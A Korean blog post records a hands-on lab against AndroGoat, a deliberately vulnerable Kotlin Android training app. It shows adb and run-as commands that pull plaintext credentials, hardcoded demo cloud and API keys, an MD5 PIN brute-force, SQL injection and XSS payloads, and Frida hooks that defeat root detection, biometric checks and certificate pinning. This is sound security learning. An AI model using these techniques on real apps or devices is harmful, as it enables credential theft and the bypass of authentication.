---
layout: post
title: "AndroGoat - Kotlin으로 만든 취약 앱을 에뮬레이터에서 직접 뜯어보기"
date: 2026-09-02 20:00:00 +0900
category: 안드로이드
author: WTCY
tags: [Android, AndroidSecurity, 모바일보안, OWASP, AndroGoat, Kotlin, Frida, adb, jadx, 정적분석, 동적분석, 취약점실습, 학습기록]
excerpt: "MASTG Playground를 끝내고 안드로이드 실습 자료를 더 찾다가 깃허브에서 AndroGoat을 봤습니다. Kotlin으로 만든 첫 취약 앱이라길래 API33 에뮬레이터에 올려 카테고리별로 직접 눌러 봤습니다. 평문 저장·하드코딩된 AWS/OpenAI 키·무방비 컴포넌트·SQL/OS 커맨드 인젝션·WebView 파일 절도·XSS·클립보드/키보드 유출·생체인증과 SSL 피닝 우회까지, adb·run-as·root·logcat·sqlite·Frida로 값을 뽑아 확인한 기록입니다."
---

> 대상: [satishpatnayak/AndroGoat](https://github.com/satishpatnayak/AndroGoat) — Kotlin으로 만든 교육용 의도적 취약 안드로이드 앱 (release v2.0.1)
> 환경: Windows 11 + Android x86_64 에뮬레이터(API 33), 배포된 `AndroGoat.apk`, adb / jadx / Frida 17

MASTG Hacking Playground를 끝내고 안드로이드 실습 자료를 더 찾다가, 깃허브에서
AndroGoat을 봤습니다. "Kotlin으로 만든 최초의 취약 앱"이라는 소개가 흥미로워서 바로
받아 봤습니다. MASTG 앱이 옛날 Java 앱이었다면 이건 targetSdk 33짜리 요즘 Kotlin 앱이라,
scoped storage나 백그라운드 클립보드 제한 같은 최신 안드로이드 정책이 다 적용되는 환경에서
같은 취약점이 어떻게 되는지 보고 싶었습니다.

앱은 저장소·컴포넌트·입력검증·측면채널·하드코딩·루트/에뮬레이터 탐지·바이너리 패칭·생체인증
같은 카테고리를 메뉴로 심어 놨습니다. 메뉴에서 항목을 누르면 그 취약점 화면이 열립니다.

![AndroGoat 메인 메뉴 — 카테고리 버튼들 아래로, exported BroadcastReceiver를 adb로 발화시키자 "Username is CrazyUser, Password is CrazyPassword and Key is 123myKe…" 토스트가 뜬 화면](/assets/img/androgoat/androgoat-home.png)

이번엔 카테고리별로 하나씩 에뮬레이터에서 실제로 발화시키고 `adb`·`run-as`·`adb root`·
`logcat`·`sqlite`·`Frida`·프록시로 값을 뽑아 확인했습니다. 저장소·컴포넌트·입력검증·측면채널·
하드코딩·탐지우회·생체인증·네트워크까지 다 눌러 봤고, 정리는 성격별로 묶었습니다.

---

## 0. 환경 — 무엇으로

배포된 `AndroGoat.apk`(릴리스 v2.0.1)를 받아 확인해 보니 두 가지가 편했습니다. 첫째,
네이티브 라이브러리가 없는 순수 Kotlin/Java라 ABI를 따질 필요 없이 어느 에뮬레이터에나
설치됩니다(MASTG의 SQLCipher ARM 문제 같은 게 없었습니다). 둘째, `targetSdk`가 33이라
API 33 에뮬레이터가 가장 충실한 환경입니다.

```console
$ aapt dump badging AndroGoat.apk | grep -E 'package|targetSdk|debuggable'
package: name='owasp.sat.agoat' ...
targetSdkVersion:'33'
application-debuggable

$ adb install -r -g AndroGoat.apk
Success
$ adb root
adbd is already running as root
```

앱이 디버그 빌드(`debuggable=true`)라 `run-as`로 앱 프라이빗 저장소에 들어갈 수 있고,
API 33 구글 API 이미지라 `adb root`도 됩니다. 두 접근권을 다 쥐고 시작했습니다. 그리고
테스트 케이스 액티비티는 대부분 `exported=false`라, 셸에서 직접 못 켜는 것은 메뉴 버튼을
눌러 실제 사용자처럼 발화시켰습니다. 다만 디버그 빌드 + `adb root`라 셸이 START_ANY_ACTIVITY를
쥐고 있어서, 화면 이동이 꼬일 때는 `am start -n`으로 비노출 액티비티를 직접 띄우기도 했습니다.

---

## 1. 로컬 저장소 — 어디에 두든 평문이면 나온다

입력한 자격증명을 앱이 SharedPreferences·SQLite·임시파일·외부저장소 어디에 넣든, 암호화가
없으면 `run-as`나 `adb root`로 그대로 읽힙니다.

### 1-1. SharedPreferences

로그인 화면에 아이디/비밀번호를 넣으면 `getSharedPreferences("users", MODE_PRIVATE)`에
평문으로 저장됩니다.

```console
$ adb shell run-as owasp.sat.agoat cat /data/data/owasp.sat.agoat/shared_prefs/users.xml
<map>
    <string name="password">P@ssw0rd123</string>
    <string name="username">admin</string>
</map>
```

### 1-2. 미암호화 SQLite (+ 로그 유출)

SQLite 화면은 자격증명을 평문 DB에 넣는데, 저장 쿼리까지 통째로 logcat에 찍습니다.

```console
$ adb exec-out run-as owasp.sat.agoat cat /data/data/owasp.sat.agoat/databases/aGoat > aGoat.db
$ xxd aGoat.db | head -1
00000000: 5351 4c69 7465 2066 6f72 6d61 7420 3300   SQLite format 3.   # 암호화 안 됨
$ sqlite3 aGoat.db "SELECT * FROM users;"
1|admin|s3cret

$ adb logcat -s Query
V Query: INSERT INTO users (username, password) VALUES('admin','s3cret')
```

`SQLite format 3` 매직이 그대로 보이면 미암호화 DB고, 여기에 더해 INSERT 문이 로그로도
새니 두 경로로 자격증명이 노출됩니다. (참고로 이 저장 쿼리는 문자열 보간이라 SQL 인젝션도
됩니다.)

### 1-3. 임시파일

임시파일 화면은 `File.createTempFile()`로 앱 디렉터리에 파일을 만들고 지우지 않아 평문이
영구히 남습니다.

```console
$ adb shell run-as owasp.sat.agoat ls /data/data/owasp.sat.agoat/ | grep tmp
users7351421958311838811tmp
$ adb shell run-as owasp.sat.agoat cat /data/data/owasp.sat.agoat/users7351421958311838811tmp
username is admin
password is P@ssw0rd123
```

### 1-4. 외부저장소 (SD Card)

외부저장소 화면은 `getExternalFilesDir()`에 평문을 쓰고, 경로까지 로그로 흘립니다.

```console
$ adb shell cat /storage/emulated/0/Android/data/owasp.sat.agoat/files/users*_tmp
This data is stored in SdCard on Tue Sep 01 ...:
 Username - admin Password -P@ssw0rd123

$ adb logcat -s Info
I Info: Data saved to/storage/emulated/0/Android/data/owasp.sat.agoat/files/users..._tmp
```

여기서 API 33의 scoped storage가 한 번 짚고 넘어갈 지점입니다. 앱은 `/sdcard` 루트가 아니라
앱 전용 외부 경로(`Android/data/<pkg>/files`)를 써서 다른 앱은 못 읽지만, `adb shell`·`adb root`·
`adb pull`은 그대로 접근됩니다. 즉 "타 앱에는 안 보인다"가 "안전하다"는 아닙니다.

---

## 2. 하드코딩된 시크릿 — 코드에 박힌 열쇠

이 앱은 시크릿을 소스에 상수로 박아 두고, 심지어 화면이나 로그로 그대로 내보냅니다. 값은
DEX 문자열로 남아 `strings`나 jadx로도 뽑히고, 런타임에도 노출됩니다.

### 2-1. AWS 키

클라우드 서비스 화면은 AWS 액세스 키/시크릿 키를 소스에 두고, `Log.d`로 logcat에 그대로
찍습니다.

```console
$ adb logcat -s "[Info]"
D [Info]: Connected to AWS account using Access key AKIAX56QKK…7G7ABC and
          secret key OviCwsFNWeoC…c1kCsfV+lOABCw   # 앱에 박힌 데모 키(일부 마스킹)
```

![클라우드 서비스 화면 — AWS 액세스 키와 시크릿 키가 담긴 다이얼로그가 그대로 표시된다](/assets/img/androgoat/cloud-aws.png)

`AKIA`로 시작하는 장기 IAM 키가 앱에 박혀 있고 로그로도 나옵니다. `gitleaks`나 `trufflehog`
같은 시크릿 스캐너가 바로 잡아내는 전형적인 패턴입니다.

### 2-2. OpenAI 키

AI Chat 화면은 OpenAI API 키를 상수로 두고 다이얼로그/토스트로 보여줍니다.

```console
$ adb shell pm path owasp.sat.agoat        # base.apk 위치
$ adb pull <base.apk> . && unzip -p base.apk classes*.dex | strings | grep 'sk-'
sk-abcdef1234567890abcdef1234567890abcdef12
```

### 2-3. 프로모코드 (클라이언트 측 인가)

쇼핑 화면은 할인 검증을 서버가 아니라 앱 안에서 합니다. `promoCode = "NEW2019"`라는 상수와
입력을 비교해 맞으면 가격을 클라이언트에서 0으로 바꿉니다. 값을 뽑아 넣으면 즉시 무료입니다.

![쇼핑 화면 — 프로모코드 NEW2019 입력 후 "Congratulations! You got this product for free" 다이얼로그가 뜬다](/assets/img/androgoat/promo-free.png)

---

## 3. 무방비 컴포넌트 — 문을 열어 둔 IPC

이 앱은 ContentProvider·BroadcastReceiver·Service·Activity를 권한 없이 `exported=true`로
내놔서, 아무 앱이나 `adb`가 직접 부를 수 있습니다.

### 3-1. exported ContentProvider

프로바이더가 권한 없이 열려 있어, `content` 도구로 시드된 자격증명이 통째로 나옵니다.

```console
$ adb shell content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins
Row: 0 id=3, username=Admin, pin=Admin
Row: 1 id=1, username=AndroGoat, pin=AndroGoat
Row: 2 id=2, username=root, pin=toor
```

### 3-2. exported BroadcastReceiver

리시버가 무방비로 열려 있어, `am broadcast` 한 줄로 하드코딩된 자격증명을 토스트로 뱉게
만들 수 있습니다(앱은 이 브로드캐스트를 스스로 보낸 적이 없습니다). 이 글 맨 위 메뉴
스크린샷의 토스트가 그렇게 뽑은 것입니다.

```console
$ adb shell am broadcast -n owasp.sat.agoat/.ShowDataReceiver
Broadcasting: Intent { cmp=owasp.sat.agoat/.ShowDataReceiver }
Broadcast completed: result=0
# 화면 토스트: Username is CrazyUser, Password is CrazyPassword and Key is 123myKey456
```

### 3-3. exported Service

인보이스 다운로드 서비스도 권한 없이 열려 있어, 비특권 셸이 다운로드를 강제 발화시킵니다.

```console
$ adb shell am start-service -n owasp.sat.agoat/.DownloadInvoiceService
$ adb logcat -s DOWNLOAD
I DOWNLOAD: Service onCreate
I DOWNLOAD: Invoice is being downloaded
```

### 3-4. 딥링크로 PIN 게이트 우회

접근제어 화면은 PIN을 넣어야 다음 화면으로 가는데, 그 다음 화면(`AccessControl1ViewActivity`)이
`exported=true` + 커스텀 딥링크를 달고 있으면서 정작 PIN 확인을 안 합니다. 그래서 PIN 화면을
아예 건너뛰고 딥링크로 바로 들어갑니다.

```console
$ adb shell am start -a android.intent.action.VIEW -d "androgoat://vulnapp"
Starting: Intent { act=android.intent.action.VIEW dat=androgoat://vulnapp/... }
# PIN 한 번 안 넣고 보호 화면(Download Invoice)이 그대로 열림
```

![PIN을 전혀 입력하지 않았는데 딥링크로 바로 열린 보호 화면 — Download Invoice 기능이 노출돼 있다](/assets/img/androgoat/deeplink-bypass.png)

웹페이지에 `<a href="androgoat://vulnapp">` 한 줄만 있어도 같은 우회가 됩니다.

### 3-5. PIN 저장은 솔트 없는 MD5

딥링크로 건너뛸 수 있으니 PIN 자체가 사실 의미가 없지만, 저장 방식도 따로 문제입니다. PIN을
정상적으로 설정해 두고 저장소를 열어 보면, 솔트 없는 MD5 해시 하나가 들어 있습니다. 4자리
숫자라 오프라인 전수로 즉시 원문이 나옵니다.

```console
$ adb shell run-as owasp.sat.agoat cat /data/data/owasp.sat.agoat/shared_prefs/pinDetails.xml
<map>
    <boolean name="pinSet" value="true" />
    <string name="pin">88cf91a1aef212f3c2cd12406983427d</string>
</map>

$ python -c "import hashlib;[print('PIN',f'{i:04d}') for i in range(10000) if hashlib.md5(f'{i:04d}'.encode()).hexdigest()=='88cf91a1aef212f3c2cd12406983427d']"
PIN 7391
```

해시가 곧 원문입니다. 여기서 설정한 PIN이 `7391`이었는데, 저장된 MD5를 0000–9999로 한 번
돌리자 그대로 복원됐습니다.

---

## 4. WebView와 XSS — 앱 안의 브라우저를 노린다

이 앱의 WebView는 세 화면(URL 로드·이름 표시·QR 스캔)에서 자바스크립트를 켜 놓고 입력을
정제 없이 렌더합니다. 각각 위험도가 다른데, 하나씩 실제로 실행시켜 봤습니다.

### 4-1. WebView URL — 앱 프라이빗 파일 절도

WebView URL 화면은 로드 버튼을 누르면 위험한 파일 접근 플래그를 전부 켜고 입력한 URL을
검증 없이 로드합니다.

```java
webViewSettings.setJavaScriptEnabled(true);
webViewSettings.setAllowFileAccess(true);
webViewSettings.setAllowFileAccessFromFileURLs(true);
webViewSettings.setAllowUniversalAccessFromFileURLs(true);
$webView.loadUrl($urlEditText.getText().toString());   // 검증 없음
```

API 30부터 `setAllowFileAccess`의 기본값이 false로 바뀌었는데, 이 코드가 셋을 다 true로
되살려 놓습니다. 그래서 URL 칸에 `file://`로 앱 샌드박스 파일 경로를 그대로 넣으면 WebView가
그 파일을 읽어 화면에 렌더합니다. 앱 프라이빗 디렉터리에 비밀 파일 하나(`secret.txt`)를
심어 두고 그 경로를 로드해 봤습니다.

![WebView URL 화면 — file:///data/data/owasp.sat.agoat/files/secret.txt 를 로드하자 앱 프라이빗 파일 내용 "AGOAT_SECRET_PIN=4321 (this file lives in the app private sandbox)" 이 그대로 렌더된다](/assets/img/androgoat/webview-fileread.png)

다른 앱은 접근 못 하는 `/data/data/<pkg>/files` 안의 파일이 WebView 화면에 그대로 떴습니다.
`setAllowUniversalAccessFromFileURLs`가 true라, 여기서 한 발 더 나가면 `file://` 페이지가
그 파일 내용을 원격 서버로 XHR 전송하는 것(파일 절도)까지 됩니다.

### 4-2. XSS — displayContent()의 document.write

XSS 화면은 이름 칸 입력을 `document.write(a.value)`로 DOM에 그대로 씁니다. 정제가 없어서
HTML/JS가 그대로 실행됩니다.

```javascript
function displayContent(){ var a=document.getElementById("name"); document.write(a.value); }
```

`<script>`는 document.write로 넣으면 실행이 안 되지만, `onerror`/`onload` 핸들러는 실행됩니다.
이름 칸에 페이로드를 넣고 Display를 누르면(입력이 WebView 안 HTML input이라 타이핑이 불안정해서,
앱의 실제 `displayContent()`를 그대로 호출하는 경로로 발화시켰습니다) 페이로드가 페이지를
다시 그립니다.

![XSS 화면 — onerror 핸들러가 실행돼 페이지를 다시 그린 결과. 빨간 배너 "XSS EXECUTED", origin: about:blank, UA: Mozilla/5.0 (Linux; Android 13; sdk_gphone64_x86_64 …) Chrome/109](/assets/img/androgoat/xss-alert.png)

JS가 실행돼 페이지를 통째로 바꾸고 UA까지 뽑아 왔습니다. 다만 `loadDataWithBaseURL(null, ...)`이라
오리진이 `about:blank`(불투명)입니다 — 스크립트는 돌지만 쿠키나 `file://` 파일에는 못 닿습니다.
이건 파일 절도가 아니라 JS 실행·화면 변조까지의 XSS입니다.

### 4-3. QR 코드 XSS — 스캔한 QR도 사용자 입력

QR 화면은 카메라로 읽은 QR 텍스트를 HTML 문자열에 그대로 이어 붙여 `loadData`로 렌더합니다.
QR 내용이 HTML/JS면 그대로 실행됩니다.

에뮬레이터 기본 후면 카메라는 `virtualscene`이라 실제 QR을 비출 수가 없어서, 여기서는 QR을
읽는 단계만 Frida로 대신했습니다 — 앱이 디코드 후 실행하는 것과 동일한 `loadData` 싱크에
공격 문자열을 그대로 흘려 넣었습니다. 싱크 이후(WebView JS 실행)는 전부 실제입니다.

![QR 화면 — 위쪽은 virtualscene 카메라, 아래 WebView에 주입된 페이로드가 실행돼 "QR-XSS EXECUTED" 초록 배너와 origin: data:text/html 이 렌더된 화면](/assets/img/androgoat/qrcode-xss.png)

여기도 `loadData`가 null baseURL이라 오리진이 `data:text/html`(불투명)입니다. JS 실행·DOM 변조·
원격 유출은 되지만 로컬 파일 읽기는 안 되는, 앱 내 WebView XSS입니다.

---

## 5. 주입 — 입력을 그대로 실행에 붙인다

### 5-1. SQL 인젝션

SQLi 화면은 입력을 쿼리에 직접 이어 붙입니다. 아이디 칸에 `' OR '1'='1`만 넣으면 조건이
항상 참이 되어 계정이 통째로 나옵니다(users 테이블은 앞의 SQLite 화면에서 시드된 상태).

![SQLi 화면 — 아이디 칸에 ' OR '1'='1 을 넣자 "Users Found: Username: (admin) password: (s3cret)" 다이얼로그가 뜬다](/assets/img/androgoat/sqli.png)

### 5-2. OS 커맨드 인젝션

OS 커맨드 화면은 입력을 `"ping " + 입력`으로 붙여 `Runtime.exec`에 그대로 넘깁니다.

```java
String ip1 = "ping " + ((Object) $ip.getText());
Process p = Runtime.getRuntime().exec(ip1);
```

`exec(String)`은 공백으로 토큰을 쪼개 `execve`를 직접 부르지, 셸(`/bin/sh`)을 거치지 않습니다.
그래서 `;`·`|`·`$()` 같은 메타문자로 새 명령을 붙이는 진짜 RCE는 안 됩니다. 대신 공백이 그대로
별도 인자가 되니, IP 칸에 `127.0.0.1 -c 3`처럼 넣으면 `-c 3`이 ping의 독립 인자로 들어갑니다.
Frida로 exec 싱크를 보면 주입한 인자가 그대로 도달한 게 보입니다.

```console
# 입력: 127.0.0.1 -c 3
[OSCMD] Runtime.exec(String) => ping 127.0.0.1 -c 3   # -c 3 이 별도 argv 로 주입됨
```

그럼 이 싱크로 임의 명령까지 되느냐를 정직하게 보이려고, 같은 exec 인자를 Frida로 `id`로
바꿔 봤습니다. 결과 창에 uid가 그대로 찍혔습니다 — 셸만 끼었다면 UI 입력만으로 나왔을
결과입니다.

![OS 커맨드 화면 — 입력을 exec 싱크에서 id로 바꾸자 결과 창에 "uid=10195(u0_a195) gid=10195(u0_a195) groups=… context=u:r:untrusted_app:s0:…" 가 출력된다](/assets/img/androgoat/oscmd-rce.png)

정리하면, UI만으로는 인자 주입까지고(공백이 별도 argv), 임의 바이너리 실행은 exec에 셸이
없어 막혀 있으며, 그 한계를 넘기는 건 Frida로 인자를 바꾸는 방식으로만 실증했습니다.

---

## 6. 측면 채널과 로그 — 옆문으로 새는 값

화면에 마스킹돼 있어도, 값이 로그·클립보드·키보드 캐시 같은 OS 공용 채널로 새면 그대로
읽힙니다.

### 6-1. 안전하지 않은 로깅

로깅 화면은 비밀번호 칸이 화면상 마스킹돼 있어도, 코드가 입력값을 그대로 로그에 찍습니다.

```console
$ adb logcat -s "Info:" System.out
I Info: : Username: agoatuser and Password: Sup3rS3cr3t!27 are verified
I System.out: Username: agoatuser and Password: Sup3rS3cr3t!27 are verified
```

API 33에선 다른 앱이 타 앱 로그를 못 읽지만(READ_LOGS 제한), 호스트의 `adb logcat`은 제약
없이 전부 수집하므로 개발자/adb 관측 채널에서는 그대로 샙니다.

### 6-2. 클립보드 — 전역 클립보드로 OTP 복사

클립보드 화면은 카드 입력을 받으면 4자리 OTP를 만들어 전역 시스템 클립보드에 그대로 붙입니다.

```java
int otp = ...(1000..9999);
ClipData clip = ClipData.newPlainText("CC Card", String.valueOf(otp));
clipboard.setPrimaryClip(clip);   // 전역 클립보드
```

화면에는 "OTP Generated and Copied: 9736" 다이얼로그가 뜨고, 같은 값이 클립보드에 올라갑니다.
API 33은 백그라운드 앱의 클립보드 읽기를 막아서, 값은 앱이 포그라운드일 때(또는 앱 안에서)
읽어야 합니다. 앱 프로세스 안에서 도는 Frida로 `setPrimaryClip`을 후킹해 값을 잡았더니 화면
OTP와 정확히 같았습니다.

```console
[CLIP] setPrimaryClip label=CC Card  text=9736
```

![클립보드 화면 — "OTP Generated and Copied: 9736" 다이얼로그. 같은 9736이 전역 클립보드에 올라가 Frida 후킹으로 잡힌다](/assets/img/androgoat/clipboard-otp.png)

전역 클립보드에 올라간 OTP는 포그라운드에 있는 아무 앱이나 읽을 수 있습니다.

### 6-3. 키보드 캐시 — 필드에 inputType이 없다

키보드 캐시 화면의 아이디/비밀번호 EditText는 레이아웃에 `android:inputType`이 아예
없습니다.

```xml
<EditText android:id="@+id/userName" .../>   <!-- inputType 없음 -->
<EditText android:id="@+id/password" .../>   <!-- textPassword 도, textNoSuggestions 도 없음 -->
```

`textPassword`가 없으니 비밀번호가 화면에 평문으로 그대로 보이고, `textNoSuggestions`가
없으니 소프트 키보드가 입력을 학습·캐시합니다. 두 칸에 눈에 띄는 값을 넣고(비밀번호가
가려지지 않는 게 화면에 보입니다), 키보드(Gboard)의 학습 캐시 DB를 root로 열어 봤습니다.

![키보드 캐시 화면 — 목표가 "기기에 저장된 키스트로크 로그 찾기". 비밀번호 MyP4ssword9910 이 마스킹 없이 평문으로 표시된다](/assets/img/androgoat/keyboard-cache.png)

```console
$ IME=com.google.android.inputmethod.latin
$ adb shell "grep -ril -e SecretUser8842 -e MyP4ssword9910 /data/data/$IME/ 2>/dev/null"
/data/data/com.google.android.inputmethod.latin/databases/trainingcachev3.db

# DB를 뽑아 문자열 확인
SecretUser8842: FOUND
MyP4ssword9910: FOUND
```

아이디뿐 아니라 비밀번호까지 키보드의 `trainingcachev3.db`에 남았습니다. 키보드 캐시를 읽는
건 IME 샌드박스라 root가 필요하지만(다른 앱은 못 봅니다), 그 전제만 맞으면 입력한 자격증명이
그대로 나옵니다.

---

## 7. 탐지 우회 — AndroGoat의 간판

AndroGoat이 MASTG 앱과 다른 지점이 이 카테고리입니다. 루트/에뮬레이터 탐지가 전부 클라이언트
측 판정이라, 그 판정 함수 하나만 Frida로 뒤집으면 무력화됩니다.

### 7-1. 루트 탐지 우회

루트 탐지는 `su` 같은 파일이 있는지 `File.exists()`로 훑는 게 전부입니다. 그래서 먼저 그
경로에 파일을 심어 탐지를 시키고(before), 파일을 그대로 둔 채 `isRooted()`를 Frida로 false로
후킹하면(after) 판정이 뒤집힙니다.

```console
$ adb shell touch /data/local/su     # 탐지 경로에 아티팩트 심기
# Check Root 탭 → "Device is rooted"

$ frida -U -p <pid> -l root.js       # isRooted() -> false
[ROOT] isRooted() hooked -> false
# 파일은 그대로인데 Check Root 탭 → "Device is not rooted"
```

<div style="display:flex;gap:10px;flex-wrap:wrap">
  <img src="/assets/img/androgoat/root-detected.png" alt="su 파일을 심은 상태에서 Check Root를 누르자 Device is rooted 다이얼로그가 뜬 화면" style="max-width:48%"/>
  <img src="/assets/img/androgoat/root-bypassed.png" alt="같은 su 파일이 있는데 Frida로 isRooted를 false로 후킹한 뒤 Check Root를 누르자 Device is not rooted 다이얼로그가 뜬 화면" style="max-width:48%"/>
</div>

파일이 존재하는데도 "not rooted"가 나오는 게 우회의 증거입니다.

### 7-2. 에뮬레이터 탐지 우회

에뮬레이터 탐지는 `Build.FINGERPRINT`·`MODEL` 같은 문자열에 `sdk`·`x86`·`goldfish` 토큰이
있는지 보는 게 전부입니다. 에뮬에서는 당연히 탐지되지만, `isEmulator()`를 Frida로 false로
후킹하면 "실기기"로 통과합니다.

```console
# Check Emulator 탭 → "This device is an Emulator"
$ frida -U -p <pid> -l emu.js        # isEmulator() -> false
# Check Emulator 탭 → "This device is not an Emulator"
```

### 7-3. 바이너리 패칭

바이너리 패칭 화면은 관리자 여부를 `private val isAdmin = false`라는 컴파일타임 상수 하나로
잠급니다. 챌린지 이름 그대로, 정답 경로는 smali에서 그 상수를 `0x0 → 0x1`로 바꿔
재패키징하는 것입니다(Kotlin `val`은 final 필드라 런타임 후킹은 타이밍이 까다로워, 이 화면은
잠긴 상태만 확인하고 정적 패칭이 정공임을 적어 둡니다). 서버 검증 없이 로컬 상수를 믿는 게
결함입니다.

---

## 8. 생체 인증 — 성공 콜백이 무엇에도 묶여 있지 않다

생체 인증 화면은 화면 안내(목표 5번)부터 대놓고 "Bypass Biometric authentication using Frida"라고
적어 놨습니다. 코드를 보면 이유가 분명합니다.

```java
biometricManager.canAuthenticate(255);          // 255 = STRONG|WEAK|DEVICE_CREDENTIAL
biometricPrompt.authenticate(promptInfo);        // CryptoObject 없음
// onAuthenticationSucceeded(): Toast/Dialog "Authentication succeeded!" 만
```

인증이 `CryptoObject` 없이 이벤트로만 묶여 있습니다. 성공했을 때 키스토어 키가 풀리는 것도
아니고, 그냥 성공 콜백이 다이얼로그를 띄우는 게 전부라, 그 콜백만 강제로 부르면 센서를 한 번도
건드리지 않고 통과합니다. API 33 에뮬레이터엔 지문 하드웨어가 없지만, 애초에 CryptoObject가
없어서 지문 등록도 필요 없습니다 — Frida로 성공 콜백을 그대로 호출했습니다.

```console
[+] forced onAuthenticationSucceeded(null) with NO sensor event
```

![생체 인증 화면 — 지문을 등록/터치한 적 없이 Frida로 성공 콜백을 부르자 "Biometric login / Authentication succeeded!" 다이얼로그가 뜬 화면](/assets/img/androgoat/biometric-bypass.png)

센서 이벤트가 한 번도 없었는데 "Authentication succeeded!"가 떴습니다. 인증 성공이 위조
가능한 이벤트라는 뜻입니다.

---

## 9. 네트워크 — 평문 전송과 피닝 우회

Network Intercepting 화면은 OkHttp로 평문 `http://demo.testfire.net`을 부릅니다. 프록시를
걸어 보면 요청이 그대로 평문으로 흐릅니다.

```console
$ adb shell settings put global http_proxy 10.0.2.2:8888
# HTTP 버튼 탭 → 호스트 리스너에 잡힌 요청:
GET http://demo.testfire.net/ HTTP/1.1
Host: demo.testfire.net
User-Agent: okhttp/4.9.3
```

같은 화면에 인증서 피닝(OkHttp3 `CertificatePinner`) 버튼도 있는데, 핀 문자열이 소스에 평문으로
박혀 있습니다.

```java
new CertificatePinner.Builder()
  .add("owasp.org", "sha256/5gsjyidrmWjcLRClfCk+Dd6O0nx1CyFrVUW5wVkwEx0=")
  .add("owasp.org", "sha256/kIdp6NNEd8wsugYyyIYFsi1ylMCED3hZbSR8ZFsa/A4=")
  .add("owasp.org", "sha256/mEflZT5enoR1FuXLgYYGqnVEoZvmf9c2bVBpiOjYQ0c=")
  .build();
```

이 에뮬레이터는 외부로 나가는 기본 라우트와 DNS가 막혀 있어서(qemu가 ICMP만 특수 처리해
`ping 8.8.8.8`은 되지만 실제 TCP/TLS는 안 나갑니다) owasp.org로 진짜 핸드셰이크를 걸 수는
없었습니다. 그래서 피닝 우회는 프로세스 안에서 정직하게 보였습니다 — 앱의 바로 그 핀 3개로
`CertificatePinner`를 똑같이 다시 만들고, 맞지 않는 인증서로 `check()`를 불러 본 뒤, 한 줄
Frida 훅을 걸고 같은 호출을 다시 했습니다.

```console
[*] rebuilt app CertificatePinner with 3 hardcoded owasp.org pins
[before] check() THREW -> pinning is enforced: SSLPeerUnverifiedException: Certificate pinning failure!
[hook] CertificatePinner.check() neutralized for host=owasp.org
[after]  check() RETURNED with the same wrong cert -> pinning DEFEATED
```

훅 전에는 맞지 않는 인증서를 정확히 걷어냈고(피닝 동작), 한 줄 훅 뒤에는 같은 인증서가 그대로
통과했습니다(피닝 무력화). 핀이 앱 코드 레벨이라 이렇게 뒤집힙니다.

---

## 마치며

카테고리는 MASTG 앱보다 넓었지만 결론은 같았습니다. 기기 안에 평문으로 둔 건 뭐든 나오고
(SharedPrefs·SQLite·임시파일·외부저장·로그·클립보드·키보드 캐시·DEX 문자열 전부 뽑혔습니다),
클라이언트가 내리는 판정은 뒤집힙니다(루트·에뮬레이터 탐지, 생체 인증 성공, 프로모코드,
isAdmin 상수, 인증서 피닝). 그리고 권한 없이 열어 둔 컴포넌트(ContentProvider·Receiver·Service·
딥링크)는 그대로 남의 진입점이 됩니다. WebView는 켜 둔 플래그만큼 위험이 커져서, 파일 접근을
열면 앱 프라이빗 파일까지 읽혔습니다. 방어는 결국 비밀은 서버로, 판정은 서버로 옮기고 크립토에
묶어서, 컴포넌트는 기본 닫힘 + 권한, 입력은 파라미터 바인딩, WebView는 파일 접근 끄기입니다.

이번엔 Kotlin으로 만든 요즘 앱(targetSdk 33)이라, 옛 취약점이 최신 안드로이드에서 어떻게
게이팅되는지를 나란히 보는 재미가 있었습니다. 외부저장이 scoped storage로 앱 전용 경로에
갇히고, 타 앱의 로그·클립보드 읽기가 막히고, WebView 파일 접근 기본값이 false가 됐지만 —
코드가 그걸 하나씩 되살려 놓으면 다시 뚫린다는 것도 그대로 봤습니다. 카메라(QR)와 외부 TLS
핸드셰이크(피닝)는 에뮬레이터 환경상 한 조각을 Frida로 대신하거나 프로세스 안에서 보였는데,
그 부분은 어디까지가 실제이고 어디부터가 대체인지 본문에 그대로 적어 뒀습니다. 깃허브에서
발견한 연습용 앱 하나로 이만큼 훑을 수 있어서 좋았습니다. 긴 글 읽어 주셔서 감사합니다.
